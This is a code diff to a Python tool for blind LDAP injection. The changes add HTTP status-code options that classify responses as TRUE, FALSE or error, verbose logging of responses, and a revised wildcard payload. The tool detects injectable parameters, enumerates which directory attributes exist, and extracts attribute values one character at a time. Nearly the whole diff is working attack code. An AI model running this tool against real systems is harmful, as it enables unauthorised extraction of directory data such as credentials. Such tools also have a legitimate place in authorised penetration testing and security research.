@@ -115,7 +115,7 @@ def send_request(
     Send a POST request and return the response.
 
     When *verbose* is True, each outgoing payload is printed to stdout before
-    the request is dispatched.
+    the request is dispatched and the response status code is logged afterwards.
 
     When *use_json* is True the payload is sent as a JSON body
     (``Content-Type: application/json``); otherwise it is sent as
@@ -131,6 +131,8 @@ def send_request(
     try:
         post_kwargs = {"json": data} if use_json else {"data": data}
         resp = session.post(url, **post_kwargs, timeout=TIMEOUT)
+        if verbose:
+            print(f"[V] Response: HTTP {resp.status_code}")
         return resp
     except requests.exceptions.ConnectionError as exc:
         print(f"[!] Connection error: {exc}", file=sys.stderr)
@@ -202,16 +204,36 @@ def is_true_response(
     resp: requests.Response | None,
     true_status: int,
     true_length: int,
-) -> bool:
+    true_codes: set[int] | None = None,
+    false_codes: set[int] | None = None,
+) -> bool | None:
     """
-    Return True when *resp* looks like a successful ("true") LDAP result.
+    Classify *resp* as TRUE, FALSE, or ERROR.
 
-    A response is considered "true" when:
+    Return values:
+      - ``True``  — the response matches the "true" (successful) LDAP result.
+      - ``False`` — the response matches the "false" (unsuccessful) result.
+      - ``None``  — the response status code is in neither *true_codes* nor
+                    *false_codes*; treat as an error, not a definitive result.
+
+    When *true_codes* or *false_codes* are provided, classification is based
+    solely on the HTTP status code:
+      - status in *true_codes*  → True
+      - status in *false_codes* → False
+      - status in neither       → None (error)
+
+    When neither set is provided the original heuristic is used:
       - the HTTP status code matches the baseline, AND
       - the content length is within LENGTH_TOLERANCE bytes of the baseline.
     """
     if resp is None:
         return False
+    if true_codes is not None or false_codes is not None:
+        if true_codes and resp.status_code in true_codes:
+            return True
+        if false_codes and resp.status_code in false_codes:
+            return False
+        return None
     length_match = abs(len(resp.content) - true_length) <= LENGTH_TOLERANCE
     status_match = resp.status_code == true_status
     return status_match and length_match
@@ -272,6 +294,8 @@ def detect_injection(
     verbose: bool = False,
     use_json: bool = False,
     probe_attr: str = "objectClass",
+    true_codes: set[int] | None = None,
+    false_codes: set[int] | None = None,
 ) -> bool:
     """
     Probe the target with common LDAP meta-characters and logic payloads.
@@ -284,6 +308,9 @@ def detect_injection(
     on every LDAP entry, but you can supply any attribute that is known to
     exist on the target entry so that the probes do not rely on ``objectClass``
     being present.
+
+    *true_codes* and *false_codes* are optional sets of HTTP status codes that
+    override the heuristic TRUE/FALSE classification (see ``is_true_response``).
 
     Returns True if at least one payload produced a distinguishable response.
     """
@@ -323,10 +350,14 @@ def detect_injection(
         resp = send_request(session, url, data, verbose, use_json)
         if resp is None:
             continue
-        looks_true = is_true_response(resp, true_status, true_length)
+        looks_true = is_true_response(resp, true_status, true_length, true_codes, false_codes)
+        if looks_true is None:
+            result_str = f"ERROR (HTTP {resp.status_code})"
+        else:
+            result_str = "TRUE" if looks_true else "FALSE"
         print(
             f"  [{label}] payload={repr(payload):<50} "
-            f"→ {'TRUE' if looks_true else 'FALSE'}"
+            f"→ {result_str}"
         )
         if looks_true:
             vulnerable = True
@@ -349,16 +380,25 @@ def discover_attributes(
     verbose: bool = False,
     use_json: bool = False,
     attributes: list[str] | None = None,
+    true_codes: set[int] | None = None,
+    false_codes: set[int] | None = None,
 ) -> list[str]:
     """
     Iterate through *attributes* and test each with a wildcard payload.
 
-    The payload format is: )(attribute=*)
+    The payload format is: )(attribute=*)(
+    The trailing ``(`` is the opening bracket for the next parameter so that
+    the surrounding LDAP query remains syntactically balanced.
     A "true" response implies that attribute exists on the LDAP entry.
 
     When *attributes* is ``None`` the built-in ``COMMON_ATTRIBUTES`` list is
     used.  Pass a custom list (e.g. built from ``--attributes``) to extend or
     replace that default set.
+
+    *true_codes* and *false_codes* are optional sets of HTTP status codes that
+    override the heuristic TRUE/FALSE classification (see ``is_true_response``).
+    Responses whose status code is in neither set are treated as errors and are
+    reported separately rather than being silently counted as FALSE.
 
     Returns the list of attributes that appear to exist.
     """
@@ -368,16 +408,19 @@ def discover_attributes(
     found: list[str] = []
 
     for attr in attributes:
-        payload = f")({attr}=*)"
+        payload = f")({attr}=*)("
         data = build_payload_data(base_data, param, payload, use_json)
         resp = send_request(session, url, data, verbose, use_json)
         if resp is None:
             continue
-        if is_true_response(resp, true_status, true_length):
+        result = is_true_response(resp, true_status, true_length, true_codes, false_codes)
+        if result is True:
             print(f"  [+] Attribute present: {attr}")
             found.append(attr)
-        else:
+        elif result is False:
             print(f"  [-] Attribute absent:  {attr}")
+        else:
+            print(f"  [?] Attribute status unknown (HTTP {resp.status_code}): {attr}")
 
     return found
 
@@ -397,6 +440,8 @@ def extract_attribute(
     true_length: int,
     verbose: bool = False,
     use_json: bool = False,
+    true_codes: set[int] | None = None,
+    false_codes: set[int] | None = None,
 ) -> str:
     """
     Extract the value of *attribute* one character at a time using LDAP wildcards.
@@ -407,6 +452,11 @@ def extract_attribute(
 
     When the response looks "true" the candidate character is appended to the
     known prefix and the search moves to the next position.
+
+    *true_codes* and *false_codes* are optional sets of HTTP status codes that
+    override the heuristic TRUE/FALSE classification (see ``is_true_response``).
+    Responses whose status code is in neither set are treated as errors and
+    skipped (the candidate character is not confirmed nor eliminated).
 
     The discovered value is printed incrementally to stdout.
 
@@ -425,7 +475,7 @@ def extract_attribute(
             resp = send_request(session, url, data, verbose, use_json)
             if resp is None:
                 continue
-            if is_true_response(resp, true_status, true_length):
+            if is_true_response(resp, true_status, true_length, true_codes, false_codes) is True:
                 extracted += char
                 print(char, end="", flush=True)
                 found_char = True
@@ -511,10 +561,40 @@ def parse_args() -> argparse.Namespace:
         ),
     )
     parser.add_argument(
+        "--true-codes",
+        metavar="CODE",
+        action="append",
+        type=int,
+        default=None,
+        dest="true_codes",
+        help=(
+            "HTTP status code to treat as a TRUE (successful) response "
+            "(can be repeated, e.g. --true-codes 200 --true-codes 302). "
+            "When specified, only the status code is used for TRUE classification "
+            "and the response-length heuristic is bypassed. "
+            "Status codes in neither --true-codes nor --false-codes are treated "
+            "as errors, not as FALSE."
+        ),
+    )
+    parser.add_argument(
+        "--false-codes",
+        metavar="CODE",
+        action="append",
+        type=int,
+        default=None,
+        dest="false_codes",
+        help=(
+            "HTTP status code to treat as a FALSE (unsuccessful) response "
+            "(can be repeated, e.g. --false-codes 401 --false-codes 403). "
+            "Status codes in neither --true-codes nor --false-codes are treated "
+            "as errors, not as FALSE."
+        ),
+    )
+    parser.add_argument(
         "-v", "--verbose",
         action="store_true",
         default=False,
-        help="Print every outgoing POST payload to stdout.",
+        help="Print every outgoing POST payload and response status to stdout.",
     )
     return parser.parse_args()
 
@@ -562,6 +642,14 @@ def main() -> None:
     if args.verbose:
         print("[*] Verbose : enabled")
 
+    # Build explicit status-code sets (None when not provided by the user).
+    true_codes: set[int] | None = set(args.true_codes) if args.true_codes else None
+    false_codes: set[int] | None = set(args.false_codes) if args.false_codes else None
+    if true_codes:
+        print(f"[*] TRUE codes : {', '.join(str(c) for c in sorted(true_codes))}")
+    if false_codes:
+        print(f"[*] FALSE codes: {', '.join(str(c) for c in sorted(false_codes))}")
+
     # Build the attribute list and choose a probe attribute for detection.
     # Extra attributes are prepended so they appear first in discovery output
     # and the first one is used as the probe attribute in logic probes (so the
@@ -591,7 +679,7 @@ def main() -> None:
     # 3. Detection
     vulnerable = detect_injection(
         session, args.url, base_data, args.param, true_status, true_length, args.verbose, use_json,
-        probe_attr,
+        probe_attr, true_codes, false_codes,
     )
 
     if not vulnerable:
@@ -607,6 +695,7 @@ def main() -> None:
         value = extract_attribute(
             session, args.url, base_data, args.param,
             args.extract, true_status, true_length, args.verbose, use_json,
+            true_codes, false_codes,
         )
         if value:
             print(f"\n[+] Extracted {args.extract} = {value}")
@@ -615,7 +704,7 @@ def main() -> None:
     else:
         attrs = discover_attributes(
             session, args.url, base_data, args.param, true_status, true_length, args.verbose, use_json,
-            all_attrs,
+            all_attrs, true_codes, false_codes,
         )
         if attrs:
             print(f"\n[+] Discovered attributes: {', '.join(attrs)}")
